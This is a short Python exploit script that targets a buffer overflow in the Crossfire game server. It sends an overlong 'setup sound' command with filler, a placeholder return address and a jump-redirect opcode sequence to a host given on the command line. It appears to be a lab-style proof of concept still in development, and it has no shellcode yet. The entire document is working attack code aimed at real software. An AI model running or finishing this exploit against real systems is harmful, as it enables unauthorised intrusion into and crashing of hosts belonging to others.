#!/usr/bin/python3
#
# Crossfire buffer overflow

import socket
import argparse
import time

# Script arguments
parser = argparse.ArgumentParser(description='Crossfire buffer overflow')
parser.add_argument('host', help='host to target')
args = parser.parse_args()

filler = 'A' * 4368
eip = 'BBBB'
redirect = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + filler + eip + redirect + "\x90\x00#"
buffer = buffer.encode('latin-1')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.host, 13327))
time.sleep(1)
print(s.recv(1024))
s.send(buffer)
s.close()
